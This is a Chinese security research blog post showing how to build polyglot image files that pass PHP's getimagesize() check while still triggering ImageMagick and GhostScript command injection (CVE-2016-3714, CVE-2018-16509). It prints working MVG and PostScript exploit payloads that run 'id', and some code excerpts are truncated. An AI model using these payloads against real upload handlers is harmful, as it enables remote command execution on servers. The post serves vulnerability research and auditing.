**作者：Phith0n@长亭科技**  
**来源：[https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html?from=timeline&isappinstalled=0](https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html?from=timeline&isappinstalled=0)**
前段时间写的文章，在微博上说HW结束分享一下，总算可以发了。感谢 @voidfyoo 提出的这个问题。
今天遇到一个代码，大致如下：
     100 && $size[1] > 100) {
        $img = new Imagick($_FILES['image']['tmp_name']);
        $img->cropThumbnailImage(100, 100);
        $img->writeImage('newimage.gif');
    }
用户上传的文件如果大于100px，则用Imagick处理成100x100的缩略图，再存储在硬盘上。
通过这个代码，我们很容易想到用Imagemagick的漏洞进行测试，但这里前面对图片大小用getimagesize进行了限制，之前爆出来的那些POC均无法通过校验，因为getimagesize并不支持类似PostScript、MVG这样的图片格式。
这时候我们怎么绕过这个限制呢？
## [0x01 Imagemagick命令执行不完全回顾](https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html?from=timeline&isappinstalled=0#0x01-imagemagick)
Imagemagick历史上曾出现过的很多命令执行漏洞，我在[vulhub](https://github.com/vulhub/vulhub)里做过以下三个：
  1. CVE-2016-3714
  2. CVE-2018-16509
  3. CVE-2019-6116
第一个是Imagemagick在处理mvg格式图片时导致的命令注入，后两个都是在处理PostScript文件时因为使用了GhostScript，而GhostScript中存在的命令注入。
Imagemagick是一个大而全的图片处理库，他能处理日常生活中见到的绝大多数图片格式，比如jpg、gif、png等，当然也包括日常生活中很少见到的图片格式，比如前面说的mvg和ps。
这三个漏洞的具体原理网上很多文章也分析过，我这里就不再分析了，但我们思考一下：
**一个文件交给Imagemagick处理，他是怎么知道这是哪种格式的图片，并如何处理呢？**
显然需要一个方法来区分文件类型，而单纯用文件名后缀来判断是不合理的（文件后缀并不是构成文件名的必要元素），常规的做法就是通过文件头来判断。
随便翻一下Imagemagick的代码，我就发现大多数文件格式的处理中，通常有一个函数，用来判断这个文件是否是对应的格式。
比如：
    // coders/ps.c
    static MagickBooleanType IsPS(const unsigned char *magick,const size_t length)
    {
      if (length width = width;
                (*result)->height = height;
            }
            return IMAGE_FILETYPE_XBM;
        }
        return 0;
    }
这函数主要是一个大while循环，遍历了文件的每一行。从这里也能看出，xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。
如果某一行格式满足`#define %s %d`，那么取出其中的字符串和数字，再从字符串中取出`width`或`height`，将数字作为图片的长和宽。
逻辑很简单呀，文本格式，而且没有限制文件头，只要有某两行可以控制即可。这和我们Imagemagick的POC差别并不大，显然是可以兼容的。
## [0x03
编写同时符合getimagesize与Imagemagick的POC](https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html?from=timeline&isappinstalled=0#0x03-getimagesizeimagemagickpoc)
理论基础结束，我们来编写一下POC吧。
首先拿出原mvg格式的POC：
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.0/oops.jpg"|"`id`)'
    pop graphic-context
我们只需要在后面增加上`#define %s %d`即可：
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.0/oops.jpg"|"`id`)'
    pop graphic-context
    #define xlogo_width 200
    #define xlogo_height 200
getimagesize成功获取其大小：
[
用存在漏洞的imagemagick进行测试，命令成功执行：
[
ps也一样，我们借助CVE-2018-16509的POC进行构造：
    %!PS
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
    /test {
    #define xlogo64_width 64
    #define xlogo64_height 64
    }
用getimagesize成功获取图片大小：
[
用存在漏洞的imagemagick+GhostScript进行测试，命令成功执行：
[
## [0x04 后记](https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html?from=timeline&isappinstalled=0#0x04)
本来想写一下Discuz下的利用的，但是鉴于某条例的规定，漏洞分析不能乱发，再加我粗略找到的利用链本身也不太完整，有一些条件限制，并不是特别好，所以就不献丑了。
事实上这个技巧在刚过去的实战中有用到，并不局限于Discuz或某个CMS。因为imagemagick和ghostscript的漏洞层出不穷，也在侧面辅助了黑盒渗透与PHP代码审计，待下一次0day爆发，也可以利用这个技巧进行盲测。
* * *